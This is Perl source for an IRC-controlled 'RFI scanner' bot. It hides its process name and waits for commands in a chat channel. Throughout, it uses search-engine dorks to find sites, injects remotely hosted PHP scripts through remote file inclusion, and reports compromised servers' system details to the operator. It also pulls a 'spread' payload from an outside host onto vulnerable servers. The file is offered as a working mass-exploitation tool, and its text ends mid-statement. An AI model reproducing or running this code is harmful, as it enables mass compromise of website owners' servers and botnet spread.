
$process   = "/usr/sbin/ateam";
my $printcmd  = "http://freewebtown.com/eridjon/cmdd.txt??";
my $id        = "http://unisel.t35.com/abe.txt?";
my $spread    = "http://unisel.t35.com/t.txt";
my $ircserver = "irc.malaysiairc.org"; 
my $start     = "!scan";
my $port      = "6667";
my $nickname  = "TettHost" . int( rand(999) ) . "]";
my $admin     = "My","Aliff"; 
my $channel   = "#test"; ## the normal chan to scan, and see the results too :P
my $chanres   = "#test"; ## the channel where u can find all the results of the bot
my $verz      = "Priv8 RFI Scanner v1.0 beta";

print "\n";
print "  Priv 8 Scanner\n";
print "  Author: SeaNet\n";
print "  Release $verz\n";
print "  Server $ircserver:$port\n";
print "  $channel and $chanres\n";
print "  Enjoy ;)\n\n";

use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;
require LWP;
$|++;

my $pid = fork;
exit if $pid;
$0 = "$process" . "\0" x 16;
my $dsp = IO::Socket::INET->new(
    PeerAddr => "$ircserver",
    PeerPort => "$port",
    Proto    => "tcp"
) or die "Can not connect on server!\n";
$dsp->autoflush(1);
print $dsp "NICK $nickname\r\n";
print $dsp "USER infira 8 *  : infira \r\n";
print $dsp "JOIN $channel\r\n";
print $dsp "PRIVMSG $channel :9,1Priv8 Scaner Pornit!! \r\n";
print $dsp "PRIVMSG $channel :8,1Comanda Scan:9,1 !scan bug dork 0,1& 4,1!google bug dork \r\n";
print $dsp "PRIVMSG $channel :9,1Priv8 RFIScanner powered By SeaNet® \r\n";
sleep(1);
print $dsp "NICK $nickname\r\n";
print $dsp "USER SeaNet *  : SeaNet \r\n";
print $dsp "JOIN $chanres\r\n";
print $dsp "PRIVMSG $chanres :9,1Aici vin rezultatele :) \r\n";
print $dsp "PRIVMSG $chanres :9,1Priv8 RFIScanner powered By SeaNet® \r\n";

while ( $line = <$dsp> ) {

    $line =~ s/\r\n$//;
    if ( $line =~ /^PING \:(.*)/ ) {
        print "PONG :$1";
        print $dsp "PONG :$1";
    }

    if ( $line =~ /PRIVMSG $channel :!help/ ) {
        sleep(1);
        display( $dsp,
"PRIVMSG $channel :9,1Working ..."
        );
        display( $dsp,
"PRIVMSG $channel :8,1[Ajutor]9,1 Pentru a scana foloseste comanda :4,1 !scan bug dork & !google bug dork"
        );
        display( $dsp,
            "PRIVMSG $channel :8,1[Ajutor]9,1 Pentru informatii server tasteaza: 4,1!info"
        );
    }

    if ( $line =~ /PRIVMSG $channel :!info/ ) {
        my $sysos  = `uname -sr`;
        my $uptime = `uptime`;
        if ( $sysos =~ /freebsd/i ) {
            $sysname = `hostname`;
            $memory =
`expr \`cat /var/run/dmesg.boot | grep "real memory" | cut -f5 -d" "\` \/ 1048576`;
            $swap = `$toploc | grep -i swap | cut -f2 -d" " | cut -f1 -d"M"`;
            chomp($memory);
            chomp($swap);
        }

        elsif ( $sysos =~ /linux/i ) {
            $sysname = `hostname -f`;
            $memory  = `free -m |grep -i mem | awk '{print \$2}'`;
            $swap    = `free -m |grep -i swap | awk '{print \$2}'`;
            chomp($swap);
            chomp($memory);
        }
        else {
            $sysname = "No Found";
            $memory  = "No found";
            $swap    = "No Found";
        }
        $uptime  =~ s/\n//g;
        $sysname =~ s/\n//g;
        $sysos   =~ s/\n//g;
        sleep(1);
        display( $dsp,
"PRIVMSG $channel :9,1Working ..."
        );
        display( $dsp,
"PRIVMSG $channel :8,1[Info]9,1 Server: $ircserver Port: $port"
        );
        display( $dsp,
"PRIVMSG $channel :8,1[Info] 9,1Software: $sysos"
        );
        display( $dsp,
"PRIVMSG $channel :8,1[Info] 9,1Process/Pid:8,1 $process"
        );
        display( $dsp,
            "PRIVMSG $channel :8,1[Info]9,1 Uptime: $uptime" );
        display( $dsp,
"PRIVMSG $channel :8,1[Info]9,1 Memorie: $memory Swap: $swap"
        );
        display( $dsp,
"PRIVMSG $channel :8,1[Info]9,1 Creator: SeaNet"
        );
        display( $dsp,
"PRIVMSG $channel :8,1[Info]9,1 Versiune: $verz"
        );
          }

    if ( $line =~ /PRIVMSG $channel :!id/ )
    {    ## ©© Script made by kangkung . Don't remove this comment !
        my $testid = $id;
        my $req    = HTTP::Request->new( GET => $testid );
        my $ua     = LWP::UserAgent->new();
        $ua->timeout(5);
        my $response = $ua->request($req);
        if ( $response->is_success ) {
            my $re = $response->content;
            if ( $re =~ /<\?php/ ) {
                sleep(1);
                display( $dsp,
"PRIVMSG $channel :8,1[Info]9,1 Id`ul este online"
                );
            }
        }
        else {
            sleep(1);
            display( $dsp,
"PRIVMSG $channel :8,1[Info]9,1 Id`ul nu este activ."
            );
            display( $dsp,
"PRIVMSG $channel :8,1[Info]9,1 Modifica setarile cu noul id."
            );
            display( $dsp,
"PRIVMSG $channel :8,1[Info]9,1 Ruleaza din nou scannerul."
            );
            display( $dsp,
"PRIVMSG $channel :8,1[WARNING]9,1 Deconectare initiata."
            );
            sleep(2);
            display( $dsp, "PRIVMSG $channel :8,1[WARNING]9,1 Bye Bye" );
            display( $dsp, "QUIT" );
        }
    }

    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) {
        if ( my $pid = fork ) {
            waitpid( $pid, 0 );
        }
        else {
            if (fork) {
                exit;
            }
            else {
                my $bug       = $1;
                my $dork      = $2;
                my $contatore = 0;
                my %hosts;
                sleep(1);
                display( $dsp,
"PRIVMSG $channel :8,1[Info]9,1Scanare pornita pentru: 4,1$dork"
                );
                my @google = &googlet($dork);
                push( my @tot, @google );
                my @puliti = &unici(@tot);
                display( $dsp,
                        "PRIVMSG $channel :9,1GOOGLE "
                      . scalar(@tot)
                      . " 9,1/9,1 "
                      . scalar(@puliti)
                      . " 9,1 pentru:4,1 $dork" );
                my $uni = scalar(@puliti);

                foreach my $site (@puliti) {
                    $contatore++;
                    if ( $contatore % 100 == 0 ) {
                    }
                    if ( $contatore == $uni - 1 ) {
                        display( $dsp,
"PRIVMSG $channel :8,1[Info]9,1 Google a terminat pentru:4,1 $dork"
                        );
                    }
                    my $test  = "http://" . $site . $bug . $id . "?";
                    my $print = "http://" . $site . $bug . $printcmd . "?";
                    my $req   = HTTP::Request->new( GET => $test );
                    my $ua    = LWP::UserAgent->new();
                    $ua->timeout(5);
                    my $response = $ua->request($req);
                    if ( $response->is_success ) {
                        my $re = $response->content;
                        if ( $re =~ /kangkung/ && $re =~ /uid=/ ) {
                            my $hs = geths($print);
                            $hosts{$hs}++;
                            if ( $hosts{$hs} == "1" ) {
                                $x = os($test);
                                 ( $type, $space ) = split( /\,/, $x );
                                sleep(4);
                                display( $dsp,
"PRIVMSG $channel :9,1Exploiting .."
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Safemode:8,1 On 9,1Os: $os 8,1Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uname -a: $un"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1HDD: Free: $free , Used: $used , Total: $all"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uptime: $up"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1ID: $id1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PWD: $pwd1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PHP Vers: $php1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Software: $sof1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Ip Addr: $ip1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Hostname: $name1"
                                );
                                display( $dsp,
"PRIVMSG $admin :9,1Safemode:8,1 On 9,1Os: $os 8,1Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $chanres :9,1Safemode:8,1 On 9,1Os: $os 8,1Link: $print"
                                );
                                my $test2 =
                                  "http://" . $site . $bug . $spread . "?";
                                my $reqz = HTTP::Request->new( GET => $test2 );
                                my $ua = LWP::UserAgent->new();
                                my $response = $ua->request($reqz);
                            }
                        }
                        elsif ( $re =~ /kangkung/ ) {
                            my $hs = geths($print);
                            $hosts{$hs}++;
                            if ( $hosts{$hs} == "1" ) {
                                $x = os($test);
                                 ( $type, $space ) = split( /\,/, $x );
                                sleep(4);
                                display( $dsp,
"PRIVMSG $channel :9,1Exploiting .."
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uname -a: 8,1$un"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1HDD: 8,1Free: ($free) Used: ($used) Total: ($all)"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uptime: 8,1 $up"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PWD: 8,1$pwd1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PHP Vers: 8,1 $php1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Software: 8,1 $sof1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1IP Addr: 8,1 $ip1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Hostname: 8,1 $name1"
                                );
                                display( $dsp,
"PRIVMSG $admin :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $chanres :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                            }
                        }
                    }
                }
            }
            exit;
        }
    }

if ( $line =~ /PRIVMSG $channel :!google\s+(.*?)\s+(.*)/ ) {
        if ( my $pid = fork ) {
            waitpid( $pid, 0 );
        }
        else {
            if (fork) {
                exit;
            }
            else {
                my $bug       = $1;
                my $dork      = $2;
                my $contatore = 0;
                my %hosts;
     
                my @google = &googlet($dork);
                push( my @tot, @google );
                my @puliti = &unici(@tot);
                display( $dsp,
                        "PRIVMSG $channel :8,1[Info]9,1Google ByPASS  "
                      . scalar(@tot)
                      . " 9,1/9,1 "
                      . scalar(@puliti)
                      . "  9,1pentru4,1 $dork" );
                my $uni = scalar(@puliti);

                foreach my $site (@puliti) {
                    $contatore++;
                    if ( $contatore % 100 == 0 ) {
                    }
                    if ( $contatore == $uni - 1 ) {
                        display( $dsp,
"PRIVMSG $channel :8,1[Info]9,1Google ByPASS a terminanat pentru4,1 $dork"
                        );
                    }
                    my $test  = "http://" . $site . $bug . $id . "?";
                    my $print = "http://" . $site . $bug . $printcmd . "?";
                    my $req   = HTTP::Request->new( GET => $test );
                    my $ua    = LWP::UserAgent->new();
                    $ua->timeout(5);
                    my $response = $ua->request($req);
                    if ( $response->is_success ) {
                        my $re = $response->content;
                        if ( $re =~ /kangkung/ && $re =~ /uid=/ ) {
                            my $hs = geths($print);
                            $hosts{$hs}++;
                            if ( $hosts{$hs} == "1" ) {
                                $x = os($test);
                                 ( $type, $space ) = split( /\,/, $x );
                                sleep(4);
                                display( $dsp,
"PRIVMSG $channel :9,1Exploiting .."
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uname -a: 8,1$un"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1HDD: 8,1Free: ($free) Used: ($used) Total: ($all)"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uptime: 8,1 $up"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1ID: $id1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PWD: 8,1$pwd1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PHP Vers: 8,1 $php1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Software: 8,1 $sof1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1IP Addr: 8,1 $ip1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Hostname: 8,1 $name1"
                                );
                                display( $dsp,
"PRIVMSG $admin :9,1Safemode:8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $chanres :9,1Safemode:8,1Off 9,1Os: $os Link: $print"
                                );
                                my $test2 =
                                  "http://" . $site . $bug . $spread . "?";
                                my $reqz = HTTP::Request->new( GET => $test2 );
                                my $ua = LWP::UserAgent->new();
                                my $response = $ua->request($reqz);
                            }
                        }
                        elsif ( $re =~ /kangkung/ ) {
                            my $hs = geths($print);
                            $hosts{$hs}++;
                            if ( $hosts{$hs} == "1" ) {
                                $x = os($test);
                                 ( $type, $space ) = split( /\,/, $x );
                                sleep(4);
                                display( $dsp,
"PRIVMSG $channel :9,1Exploiting .."
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Safemode:8,1 On 9,1Os: $os 8,1Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uname -a: 8,1$un"
                                );
                                display( $dsp,
"PRIVMSG $channel :12(4hdd12) 12 Free: ($free) Used: ($used) Total: ($all) "
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uptime: 8,1 $up"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PWD: 8,1$pwd1"
                                );
                                display( $dsp,
"PRIVMSG $channel :12(4php12) 12 $php1"
                                );
                                display( $dsp,
"PRIVMSG $channel :12(4software12) 12 $sof1 "
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1IP Addr: 8,1 $ip1"
                                );
                                display( $dsp,
"PRIVMSG $channel :12(4server-name12) 12 $name1 "
                                );
                                display( $dsp,
"PRIVMSG $admin :9,1Safemode:8,1 On 9,1Os: $os 8,1Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $chanres :9,1Safemode:8,1 On 9,1Os: $os 8,1Link: $print"
                                );
                            }
                        }
                    }
                }
            }
            exit;
        }
    }

    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) {
        if ( my $pid = fork ) {
            waitpid( $pid, 0 );
        }
        else {
            if (fork) {
                exit;
            }
            else {
                my $bug       = $1;
                my $dork      = $2;
                my $contatore = 0;
                my %hosts;
                my @alltheweb = &alltheweb($dork);
                push( my @tot, @alltheweb );
                my @puliti = &unici(@tot);
                display( $dsp,
                        "PRIVMSG $channel :9,1ALLTHEWEB  "
                      . scalar(@tot)
                      . " 9,1/9,1 "
                      . scalar(@puliti)
                      . " 9,1pentru4,1 $dork" );
                my $uni = scalar(@puliti);

                foreach my $site (@puliti) {
                    $contatore++;
                    if ( $contatore % 100 == 0 ) {
                    }
                    if ( $contatore == $uni - 1 ) {
                        display( $dsp,
"PRIVMSG $channel :9,1AllTheWeb a terminat pentru4,1 $dork"
                        );
                    }
                    my $test  = "http://" . $site . $bug . $id . "?";
                    my $print = "http://" . $site . $bug . $printcmd . "?";
                    my $req   = HTTP::Request->new( GET => $test );
                    my $ua    = LWP::UserAgent->new();
                    $ua->timeout(5);
                    my $response = $ua->request($req);
                    if ( $response->is_success ) {
                        my $re = $response->content;
                        if ( $re =~ /kangkung/ && $re =~ /uid=/ ) {
                            my $hs = geths($print);
                            $hosts{$hs}++;
                            if ( $hosts{$hs} == "1" ) {
                                $x = os($test);
                                 ( $type, $space ) = split( /\,/, $x );
                                sleep(4);
                                display( $dsp,
"PRIVMSG $channel :9,1Exploiting .."
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uname -a: 8,1$un"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1HDD: 8,1Free: ($free) Used: ($used) Total: ($all)"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uptime: 8,1 $up"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1ID: $id1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PWD: 8,1$pwd1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PHP Vers: 8,1 $php1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Software: 8,1 $sof1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1IP Addr: 8,1 $ip1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Hostname: 8,1 $name1"
                                );
                                display( $dsp,
"PRIVMSG $admin :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $chanres :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                my $test2 =
                                  "http://" . $site . $bug . $spread . "?";
                                my $reqz = HTTP::Request->new( GET => $test2 );
                                my $ua = LWP::UserAgent->new();
                                my $response = $ua->request($reqz);
                            }
                        }
                        elsif ( $re =~ /kangkung/ ) {
                            my $hs = geths($print);
                            $hosts{$hs}++;
                            if ( $hosts{$hs} == "1" ) {
                                $x = os($test);
                                 ( $type, $space ) = split( /\,/, $x );
                                sleep(4);
                                display( $dsp,
"PRIVMSG $channel :9,1Exploiting .."
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uname -a: 8,1$un"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1HDD: 8,1Free: ($free) Used: ($used) Total: ($all)"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uptime: 8,1 $up"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PWD: 8,1$pwd1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PHP Vers: 8,1 $php1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Software: 8,1 $sof1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1IP Addr: 8,1 $ip1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Hostname: 8,1 $name1"
                                );
                                display( $dsp,
"PRIVMSG $admin :9,1Safemode:8,1 On 9,1Os: $os 8,1Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $chanres :9,1Safemode:8,1 On 9,1Os: $os 8,1Link: $print"
                                );
                            }
                        }
                    }
                }
            }
            exit;
        }
    }

    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) {
        if ( my $pid = fork ) {
            waitpid( $pid, 0 );
        }
        else {
            if (fork) {
                exit;
            }
            else {
                my $bug       = $1;
                my $dork      = $2;
                my $contatore = 0;
                my %hosts;
                my @uol = &uolsub($dork);
                push( my @tot, @uol );
                my @puliti = &unici(@tot);
                display( $dsp,
                        "PRIVMSG $channel :9,1UOL  "
                      . scalar(@tot)
                      . " 9,1/9,1 "
                      . scalar(@puliti)
                      . "   11pentru9,1 $dork" );
                my $uni = scalar(@puliti);

                foreach my $site (@puliti) {
                    $contatore++;
                    if ( $contatore % 100 == 0 ) {
                    }
                    if ( $contatore == $uni - 1 ) {
                        display( $dsp,
"PRIVMSG $channel :9,1UOL a terminat pentru4,1 $dork"
                        );
                    }
                    my $test  = "http://" . $site . $bug . $id . "?";
                    my $print = "http://" . $site . $bug . $printcmd . "?";
                    my $req   = HTTP::Request->new( GET => $test );
                    my $ua    = LWP::UserAgent->new();
                    $ua->timeout(5);
                    my $response = $ua->request($req);
                    if ( $response->is_success ) {
                        my $re = $response->content;
                        if ( $re =~ /kangkung/ && $re =~ /uid=/ ) {
                            my $hs = geths($print);
                            $hosts{$hs}++;
                            if ( $hosts{$hs} == "1" ) {
                                $x = os($test);
                                 ( $type, $space ) = split( /\,/, $x );
                                sleep(4);
                                display( $dsp,
"PRIVMSG $channel :9,1Exploiting .."
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uname -a: 8,1$un"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1HDD: 8,1Free: ($free) Used: ($used) Total: ($all)"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uptime: 8,1 $up"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1ID: $id1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PWD: 8,1$pwd1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PHP Vers: 8,1 $php1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Software: 8,1 $sof1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1IP Addr: 8,1 $ip1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Hostname: 8,1 $name1"
                                );
                                display( $dsp,
"PRIVMSG $admin :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $chanres :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                my $test2 =
                                  "http://" . $site . $bug . $spread . "?";
                                my $reqz = HTTP::Request->new( GET => $test2 );
                                my $ua = LWP::UserAgent->new();
                                my $response = $ua->request($reqz);
                            }
                        }
                        elsif ( $re =~ /kangkung/ ) {
                            my $hs = geths($print);
                            $hosts{$hs}++;
                            if ( $hosts{$hs} == "1" ) {
                                $x = os($test);
                                 ( $type, $space ) = split( /\,/, $x );
                                sleep(4);
                                display( $dsp,
"PRIVMSG $channel :9,1Exploiting .."
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uname -a: 8,1$un"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1HDD: 8,1Free: ($free) Used: ($used) Total: ($all)"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uptime: 8,1 $up"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PWD: 8,1$pwd1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PHP Vers: 8,1 $php1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Software: 8,1 $sof1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1IP Addr: 8,1 $ip1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Hostname: 8,1 $name1"
                                );
                                display( $dsp,
"PRIVMSG $admin :9,1Safemode:8,1 On 9,1Os: $os 8,1Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $chanres :9,1Safemode:8,1 On 9,1Os: $os 8,1Link: $print"
                                );
                            }
                        }
                    }
                }
            }
            exit;
        }
    }

    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) {
        if ( my $pid = fork ) {
            waitpid( $pid, 0 );
        }
        else {
            if (fork) {
                exit;
            }
            else {
                my $bug       = $1;
                my $dork      = $2;
                my $contatore = 0;
                my %hosts;
                my @altavista   = &altavista($dork);
                push( my @tot, @allist, @alldeist, @allistus );
                my @puliti = &unici(@tot);
                display( $dsp,
                        "PRIVMSG $channel :9,1ALTAVISTA  "
                      . scalar(@tot)
                      . " 9,1/9,1 "
                      . scalar(@puliti)
                      . " 9,1pentru4,1 $dork" );
                my $uni = scalar(@puliti);

                foreach my $site (@puliti) {
                    $contatore++;
                    if ( $contatore % 100 == 0 ) {
                    }
                    if ( $contatore == $uni - 1 ) {
                        display( $dsp,
"PRIVMSG $channel :9,1ALTAVISTA a terminat pentru9,1 $dork"
                        );
                    }
                    my $test  = "http://" . $site . $bug . $id . "?";
                    my $print = "http://" . $site . $bug . $printcmd . "?";
                    my $req   = HTTP::Request->new( GET => $test );
                    my $ua    = LWP::UserAgent->new();
                    $ua->timeout(5);
                    my $response = $ua->request($req);
                    if ( $response->is_success ) {
                        my $re = $response->content;
                        if ( $re =~ /kangkung/ && $re =~ /uid=/ ) {
                            my $hs = geths($print);
                            $hosts{$hs}++;
                            if ( $hosts{$hs} == "1" ) {
                                $x = os($test);
                                 ( $type, $space ) = split( /\,/, $x );
                                sleep(4);
                                display( $dsp,
"PRIVMSG $channel :9,1Exploiting .."
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uname -a: 8,1$un"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1HDD: 8,1Free: ($free) Used: ($used) Total: ($all)"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uptime: 8,1 $up"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1ID: $id1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PWD: 8,1$pwd1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PHP Vers: 8,1 $php1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Software: 8,1 $sof1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1IP Addr: 8,1 $ip1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Hostname: 8,1 $name1"
                                );
                                display( $dsp,
"PRIVMSG $admin :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $chanres :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                my $test2 =
                                  "http://" . $site . $bug . $spread . "?";
                                my $reqz = HTTP::Request->new( GET => $test2 );
                                my $ua = LWP::UserAgent->new();
                                my $response = $ua->request($reqz);
                            }
                        }
                        elsif ( $re =~ /kangkung/ ) {
                            my $hs = geths($print);
                            $hosts{$hs}++;
                            if ( $hosts{$hs} == "1" ) {
                                $x = os($test);
                                 ( $type, $space ) = split( /\,/, $x );
                                sleep(4);
                                display( $dsp,
"PRIVMSG $channel :9,1Exploiting .."
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uname -a: 8,1$un"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1HDD: 8,1Free: ($free) Used: ($used) Total: ($all)"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uptime: 8,1 $up"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PWD: 8,1$pwd1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PHP Vers: 8,1 $php1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Software: 8,1 $sof1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1IP Addr: 8,1 $ip1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Hostname: 8,1 $name1"
                                );
                                display( $dsp,
"PRIVMSG $admin :9,1Safemode:8,1 On 9,1Os: $os 8,1Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $chanres :9,1Safemode:8,1 On 9,1Os: $os 8,1Link: $print"
                                );
                            }
                        }
                    }
                }
            }
            exit;
        }
    }

    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) {
        if ( my $pid = fork ) {
            waitpid( $pid, 0 );
        }
        else {
            if (fork) {
                exit;
            }
            else {
                my $bug       = $1;
                my $dork      = $2;
                my $contatore = 0;
                my %hosts;
                my @searchlist = &search($dork);
                my @search2    = &searchs($dork);
                push( my @tot, @searchlist, @search2 );
                my @puliti = &unici(@tot);
                display( $dsp,
                        "PRIVMSG $channel :9,1SEARCH  "
                      . scalar(@tot)
                      . " 9,1/9,1 "
                      . scalar(@puliti)
                      . " 9,1 pentru4,1 $dork" );
                my $uni = scalar(@puliti);

                foreach my $site (@puliti) {
                    $contatore++;
                    if ( $contatore % 100 == 0 ) {
                    }
                    if ( $contatore == $uni - 1 ) {
                        display( $dsp,
"PRIVMSG $channel :9,1SEARCH a terminat pentru4,1 $dork"
                        );
                    }
                    my $test  = "http://" . $site . $bug . $id . "?";
                    my $print = "http://" . $site . $bug . $printcmd . "?";
                    my $req   = HTTP::Request->new( GET => $test );
                    my $ua    = LWP::UserAgent->new();
                    $ua->timeout(5);
                    my $response = $ua->request($req);
                    if ( $response->is_success ) {
                        my $re = $response->content;
                        if ( $re =~ /kangkung/ && $re =~ /uid=/ ) {
                            my $hs = geths($print);
                            $hosts{$hs}++;
                            if ( $hosts{$hs} == "1" ) {
                                $x = os($test);
                                 ( $type, $space ) = split( /\,/, $x );
                                sleep(4);
                                display( $dsp,
"PRIVMSG $channel :9,1Exploiting .."
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uname -a: 8,1$un"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1HDD: 8,1Free: ($free) Used: ($used) Total: ($all)"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uptime: 8,1 $up"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1ID: $id1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PWD: 8,1$pwd1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PHP Vers: 8,1 $php1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Software: 8,1 $sof1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1IP Addr: 8,1 $ip1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Hostname: 8,1 $name1"
                                );
                                display( $dsp,
"PRIVMSG $admin :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $chanres :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                my $test2 =
                                  "http://" . $site . $bug . $spread . "?";
                                my $reqz = HTTP::Request->new( GET => $test2 );
                                my $ua = LWP::UserAgent->new();
                                my $response = $ua->request($reqz);
                            }
                        }
                        elsif ( $re =~ /kangkung/ ) {
                            my $hs = geths($print);
                            $hosts{$hs}++;
                            if ( $hosts{$hs} == "1" ) {
                                $x = os($test);
                                 ( $type, $space ) = split( /\,/, $x );
                                sleep(4);
                                display( $dsp,
"PRIVMSG $channel :9,1Exploiting .."
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uname -a: 8,1$un"
                                );
                                display( $dsp,
